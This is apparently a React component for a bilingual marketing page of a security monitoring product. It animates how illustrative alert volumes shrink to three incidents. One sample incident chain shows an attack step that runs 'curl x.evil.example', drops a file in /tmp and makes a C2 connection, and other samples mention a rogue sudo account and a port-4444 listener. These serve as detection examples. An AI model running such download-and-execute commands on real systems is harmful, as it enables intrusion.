import { motion, useMotionValueEvent, useScroll } from "motion/react";
import { useMemo, useRef, useState } from "react";
import { useCopy } from "@/i18n";
import { ChapterHead, DemoBadge, EASE } from "./chapter";

// 每一道闸之后还剩多少（示意量级），以及点阵里留几个点。
const STAGES = [
  { count: 2_481_906, dots: 220 },
  { count: 10_000, dots: 150 },
  { count: 1_214, dots: 90 },
  { count: 431, dots: 50 },
  { count: 27, dots: 18 },
  { count: 3, dots: 3 },
];

const COPY = {
  "zh-CN": {
    kicker: "纳管即安全",
    title: (
      <>
        一万条告警进来，
        <br />
        <span className="text-neutral-500">三个真事件出去。</span>
      </>
    ),
    body: "主机一上线，进程、文件、登录、外连就开始流进来。往下滚，看它们一道道闸门被筛掉——留下来的，才值得你看。",
    demo: "示意数据",
    stages: [
      ["原始事件", "agent、流量探针与 syslog 一天的量"],
      ["规则与情报命中", "Sigma 规则 + IP / 域名 / 哈希情报碰撞"],
      ["去重", "同一主机同一规则的重复告警只留一条并计数"],
      ["误报抑制", "分析师掐掉的噪声源，可撤销、有有效期"],
      ["关联成事件", "按主机、进程血缘、用户把告警串成攻击故事"],
      ["AI 研判后需要你看", "带工具查证后定性；低危良性 7 天后自动结案"],
    ],
    incidents: [
      {
        host: "web-01",
        title: "SSH 爆破得手后下载执行",
        verdict: "恶意 · 96%",
        chain: ["sshd", "bash", "curl x.evil.example", "/tmp/.x", "c2 外连（情报命中）"],
      },
      { host: "db-01", title: "新增 sudo 账户 tmpadmin", verdict: "可疑 · 需复核" },
      { host: "gw-01", title: "首次出现的进程监听 4444 端口", verdict: "可疑 · 需复核" },
    ],
    closed: "其余 24 个：AI 判良性、低危，到期自动结案并留审计",
    scroll: "继续往下滚",
  },
  en: {
    kicker: "Onboarded means secured",
    title: (
      <>
        Ten thousand alerts in,
        <br />
        <span className="text-neutral-500">three real incidents out.</span>
      </>
    ),
    body: "The moment a host is online, processes, files, logons and connections start flowing in. Keep scrolling and watch them filtered gate by gate — what survives is what deserves your attention.",
    demo: "Illustrative",
    stages: [
      ["Raw events", "a day from agents, the network sensor and syslog"],
      ["Rule & intel hits", "Sigma rules + IP / domain / hash intel matching"],
      ["Dedup", "repeats of the same rule on the same host collapse into one"],
      ["Suppression", "noise sources analysts muted — revocable, with expiry"],
      ["Correlated incidents", "alerts stitched by host, process lineage and user"],
      ["Need you after AI triage", "investigated with tools; low-risk benign ones auto-close in 7 days"],
    ],
    incidents: [
      {
        host: "web-01",
        title: "SSH brute force, then download & execute",
        verdict: "Malicious · 96%",
        chain: ["sshd", "bash", "curl x.evil.example", "/tmp/.x", "C2 (intel hit)"],
      },
      { host: "db-01", title: "New sudo account tmpadmin", verdict: "Suspicious · review" },
      { host: "gw-01", title: "First-seen process listening on 4444", verdict: "Suspicious · review" },
    ],
    closed: "The other 24: benign and low-risk per AI, auto-closed later with an audit trail",
    scroll: "Keep scrolling",
  },
};

/** 稳定的伪随机点位，避免每次渲染跳动。 */
function useDots(n: number) {
  return useMemo(() => {
    let seed = 7;
    const rand = () => ((seed = (seed * 16807) % 2147483647) / 2147483647);
    return Array.from({ length: n }, () => ({ x: rand() * 100, y: rand() * 100, s: 0.6 + rand() * 0.8 }));
  }, [n]);
}

export function Funnel() {
  const t = useCopy(COPY);
  const ref = useRef<HTMLDivElement>(null);
  const [stage, setStage] = useState(0);
  const { scrollYProgress } = useScroll({ target: ref, offset: ["start start", "end end"] });
  useMotionValueEvent(scrollYProgress, "change", (p) =>
    setStage(Math.min(STAGES.length - 1, Math.max(0, Math.floor(p * STAGES.length * 1.05)))),
  );
  const dots = useDots(STAGES[0].dots);
  const visible = STAGES[stage].dots;
  const last = stage === STAGES.length - 1;

  return (
    <section id="secure" className="relative scroll-mt-20">
      <div className="mx-auto max-w-[1400px] px-4 pt-28 sm:px-6 lg:px-8">
        <ChapterHead index="02" kicker={t.kicker} title={t.title} body={t.body} tone="rose" />
      </div>
      {/* 滚动驱动：外层撑出滚动距离，内层吸顶，按滚动进度推进闸门 */}
      <div ref={ref} className="relative h-[360vh]">
      <div className="sticky top-0 flex h-screen items-center overflow-hidden px-4 sm:px-6 lg:px-8">
        <div className="mx-auto grid w-full max-w-[1400px] gap-6 lg:grid-cols-2 lg:items-center lg:gap-10">
          <div>
            <p className="mb-4 font-mono text-xs uppercase tracking-[0.22em] text-rose-300">02 · {t.kicker}</p>
            <div className="relative">
              {/* 左侧进度线随滚动填满 */}
              <div className="absolute bottom-2 left-0 top-2 w-px bg-white/10" />
              <motion.div
                className="absolute bottom-2 left-0 top-2 w-px origin-top bg-gradient-to-b from-neutral-300 to-rose-400"
                style={{ scaleY: scrollYProgress }}
              />
              <ol className="space-y-0.5 pl-3 sm:space-y-1">
                {t.stages.map(([name, desc], i) => (
                  <li
                    key={name}
                    className={`flex items-baseline gap-4 rounded-lg px-3 py-1 transition-all duration-500 sm:py-2 ${
                      i === stage ? "bg-white/[0.06]" : ""
                    } ${i > stage ? "opacity-30" : ""}`}
                  >
                    <span className="w-24 shrink-0 text-right font-mono text-sm tabular-nums text-white sm:w-28">
                      {STAGES[i].count.toLocaleString()}
                    </span>
                    <span>
                      <span className={`text-sm ${i === stage ? "text-white" : "text-neutral-400"}`}>{name}</span>
                      {i === stage && <span className="mt-0.5 hidden text-xs text-neutral-500 sm:block">{desc}</span>}
                    </span>
                  </li>
                ))}
              </ol>
            </div>
          </div>

          <div className="relative">
            <div className="flex items-end justify-between gap-4">
              <div>
                <motion.p
                  key={stage}
                  initial={{ opacity: 0, y: 12, filter: "blur(6px)" }}
                  animate={{ opacity: 1, y: 0, filter: "blur(0px)" }}
                  transition={{ duration: 0.5, ease: EASE }}
                  className={`font-mono text-5xl font-medium tabular-nums tracking-tight sm:text-7xl ${
                    last ? "text-rose-300" : "text-white"
                  }`}
                >
                  {STAGES[stage].count.toLocaleString()}
                </motion.p>
                <p className="mt-1 text-sm text-neutral-500">{t.stages[stage][0]}</p>
              </div>
              <DemoBadge label={t.demo} />
            </div>
            <div className="relative mt-4 h-[130px] sm:mt-6 sm:h-[220px]">
              <div
                className={`pointer-events-none absolute inset-0 rounded-full blur-3xl transition-colors duration-1000 ${
                  last ? "bg-rose-500/15" : "bg-white/[0.03]"
                }`}
              />
              {dots.map((d, i) => {
                const keep = i < visible;
                return (
                  <motion.span
                    key={i}
                    className="absolute h-2 w-2 rounded-full"
                    style={{ left: `${d.x}%`, top: `${d.y}%` }}
                    animate={{
                      opacity: keep ? (last ? 1 : 0.35 + d.s * 0.3) : 0,
                      scale: keep ? (last ? 3 : d.s) : 0.2,
                      left: last && keep ? `${18 + i * 32}%` : `${d.x}%`,
                      top: last && keep ? "45%" : `${d.y}%`,
                      backgroundColor: last ? "#fb7185" : stage >= 4 ? "#fda4af" : "#d4d4d4",
                      boxShadow: last ? "0 0 24px 4px rgba(251,113,133,0.6)" : "0 0 8px 1px rgba(255,255,255,0.15)",
                    }}
                    transition={{ duration: 0.9, ease: EASE, delay: keep ? 0 : (i % 17) * 0.015 }}
                  />
                );
              })}
            </div>

            <div className="mt-4 min-h-[240px] sm:mt-6">
              {last ? (
                <div className="space-y-3">
                  {t.incidents.map((inc, i) => (
                    <motion.div
                      key={inc.host}
                      initial={{ opacity: 0, y: 16 }}
                      animate={{ opacity: 1, y: 0 }}
                      transition={{ duration: 0.6, ease: EASE, delay: 0.15 * i }}
                      className={`rounded-xl border p-4 ${
                        i === 0 ? "border-rose-400/30 bg-rose-500/[0.07]" : "border-white/10 bg-white/[0.03]"
                      }`}
                    >
                      <div className="flex flex-wrap items-center gap-x-3 gap-y-1 text-sm">
                        <span className="font-mono text-xs text-neutral-500">{inc.host}</span>
                        <span className="text-white">{inc.title}</span>
                        <span className={`ml-auto text-xs ${i === 0 ? "text-rose-300" : "text-amber-300"}`}>
                          {inc.verdict}
                        </span>
                      </div>
                      {inc.chain && (
                        <div className="mt-3 flex flex-wrap items-center gap-1.5 font-mono text-[11px]">
                          {inc.chain.map((node, n) => (
                            <span key={node} className="flex items-center gap-1.5">
                              {n > 0 && <span className="text-rose-300/60">→</span>}
                              <span className="rounded bg-black/40 px-1.5 py-0.5 text-rose-100">{node}</span>
                            </span>
                          ))}
                        </div>
                      )}
                    </motion.div>
                  ))}
                  <motion.p
                    initial={{ opacity: 0 }}
                    animate={{ opacity: 1 }}
                    transition={{ delay: 0.6 }}
                    className="pt-1 text-xs text-neutral-500"
                  >
                    {t.closed}
                  </motion.p>
                </div>
              ) : (
                <p className="pt-20 text-center text-xs uppercase tracking-[0.2em] text-neutral-600">↓ {t.scroll}</p>
              )}
            </div>
          </div>
        </div>
      </div>
      </div>
    </section>
  );
}
